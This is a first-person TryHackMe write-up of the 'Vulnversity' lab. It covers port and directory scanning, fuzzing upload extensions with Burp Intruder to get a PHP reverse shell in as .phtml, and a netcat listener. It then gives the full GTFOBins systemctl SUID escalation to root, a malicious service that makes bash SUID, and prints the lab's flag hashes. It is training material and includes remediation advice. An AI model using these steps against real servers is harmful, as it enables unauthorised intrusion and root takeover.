# Target: Vulnversity
**Platform:** TryHackMe
[Vulnversity on TryHackMe](https://tryhackme.com/room/vulnversity)

| Target Name | IP Address | OS | Difficulty |
| :--- | :--- | :--- | :--- |
| Vulnversity | 10.113.162.228 | Linux | Easy |

---

## Phase 1: Reconnaissance & Enumeration

I started my reconnaissance by scanning the machine using the `Nmap` tool. I used flag the `-sV` to check version of service running on each port.
**Nmap Scan:**
```bash
nmap -sV 10.113.162.228
```

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

I noticed that on port 3333 an HTTP Apache server was running, so I tried to check directories located on it's. I used `Gobuster` tool to do it, I used a wordlist to check for directories which were already located on my Kali Linux system.
**Directory Brute-forcing:**
```bash
gobuster dir -u http://10.113.162.228:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

```
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 324] [--> http://10.113.162.228:3333/images/]
/css                  (Status: 301) [Size: 321] [--> http://10.113.162.228:3333/css/]
/js                   (Status: 301) [Size: 320] [--> http://10.113.162.228:3333/js/]
/internal             (Status: 301) [Size: 326] [--> http://10.113.162.228:3333/internal/]
Progress: 141707 / 141707 (100.00%)
===============================================================
Finished
```

First three directories looked normal, but the 4th one `/internal` looked interesting. I entered the URL of this directory `http://10.113.162.228:3333/internal/` to check what's inside. This page showed a me place where I can drop the file and upload it on the server. So I had the idea to create the file with malicious code and upload it there to run a reverse shell to connect with my system.

## Phase 2: Initial Foothold (Gaining Access)

First I wanted to check which file extension the page was accepting, so I made the file containing some file extensions.
**Creating File with Extensions:**
```bash
nano phpext.txt
```

After opening the editor I entered the extensions:
```
.php
.php3
.php4
.php5
.phtml
```

I saved the file and it was ready for testing. I also made a potential file on which I could test extensions.
**Creating Testing File:**
```bash
touch shell.php
```

So I opened `BurpSuite` tool which was already connected with my browser and started intercepting the requests. I uploaded the file `shell.php` on the server and captured the request. I sent it to the Intruder, and started configuring the `Sniper` attack. I chose the `Sniper` attack, added `§` symbols to the filename which looks like this: `shell§.php§`, uploaded file `phpext.txt` to payloads configuration and turned off the function which translates characters like `.` in the URL. After that the attack was configured so I started it. After a while I saw that for the first 4 extensions the length of the request was the same `773/774`, but for the extension `.phtml` length of the request was `759`, so that means that this extension was accepted by the server.
Knowing that I started configuring file with malicious payload to send to the server. I downloaded the `php-reverse-shell` file from GitHub [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Next, I edited this file by changing the IP to my vpn IP. Next I changed the name of the file to `php-reverse-shell.phtml`. The file was configured.
Before sending it to the server I started a listener by using 'Netcat' tool. I set the port to `1234` because it match with the port number in the reverse shell file.
**Listener Setup:**
```bash
nc -lvnp 1234
```

After that I uploaded the file to the server. Next I entered the URL `http://10.113.162.228:3333/internal/uploads/php-reverse-shell.phtml` to execute the payload. When I switched to terminal, where the listener was running, I saw the connection with the server was successful.
```
connect to [192.168.158.248] from (UNKNOWN) [10.113.162.228] 36234
Linux ip-10-113-162-228 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 09:44:43 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```


## Phase 3: Privilege Escalation & Post-Exploitation

To check the user who manages the web serverm I checked the directories in the `home` directory.
**Checking directories in home Directory:**
```bash
ls home
```

```
bill
ubuntu
```

To find user flag I checked directories in `bill` directory.
**Checking directories in bill Directory:**
```bash
ls home/bill
```

```
user.txt
```

There I found the file containing the flag, so I read it.
**Reading the user Flag:**
```bash
cat home/bill/user.txt
```

```
8bd7992fbe8a6ad22a63361004cfcedb
```

Next I searched for all SUID files. I used command `find` with appropriate flags, at the end I added `2>/dev/null` to make this command hides files with permission denied.
**Finding SUID Files:**
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Since `/bin/systemctl` runs with root privileges, I used GTFOBins exploit. I created a temporary, malicious service that assigns the SUID permission to the bash shell.
**Creating Malicious Service:**
```bash
TF=$(mktemp).service

echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
```

**Linking New Service to systemctl:**
```bash
/bin/systemctl link $TF
```

**Triggering the payload:**
```bash
/bin/systemctl enable --now $TF
```

**Becoming a Root:**
```bash
/bin/bash -p
```

After all this commands I checked if I'm root.
**Proof of Root:**
```bash
whoami
```

```
root
```

Because I was root I checked the `root` directory to find the flag.
**Checking the root Directory:**
```bash
ls root
```

```
root.txt
snap
```

The file `root.txt` must contain the flag so I read it.
**Reading the file containing flag:**
```bash
cat root/root.txt
```

```
a58ff8579f0a9270368d33a9966c7fd5
```

## Conclusion & Takeaways

**Summary:** Gaining initial access to Vulnversity required directory enumeration to find a hidden upload page (`/internal/`). By fuzzing file extensions with Burp Suite Intruder, I discovered that the `.phtml` extension bypassed the filter, allowing me to upload a PHP reverse shell. Privilege escalation was achieved by identifying a misconfigured SUID bit on the `/bin/systemctl` binary, which I exploited using a GTFOBins payload to create a malicious service and spawn a root shell.

**What I Learned:** 
* **Web Fuzzing:** I solidified my understanding of using Burp Suite Intruder (Sniper attack) to fuzz web inputs and bypass basic filters.
* **Linux Privilege Escalation:** I learned how to exploit SUID permissions on `systemctl` by writing a custom `systemd` service to execute commands as root.

**Remediation:** To secure this server, system administrators should apply the following patches:
1. **Secure File Uploads:** The web server should use a strict allowlist of permitted file extensions (e.g., `.jpg`, `.png`), validate MIME types, and disable script execution in the `/uploads/` directory.
2. **Enforce Least Privilege:** The `/bin/systemctl` binary must not have the SUID bit set. Administrators should immediately remove it by running `chmod -s /bin/systemctl`.

### Speedrun Reflection: What I would do faster/differently now
During this speedrun, I realized that I can save a lot of time by immediately checking alternative PHP extensions (like `.phtml`) when file uploads are blocked, rather than just relying on `.php`. I also learned a valuable lesson about Burp Suite Intruder: I must remember to uncheck the 'URL-encode these characters' box. Because I initially left it checked, the web server didn't recognize my payloads. Next time, I will double-check my payload encoding settings before launching the attack to save troubleshooting time.
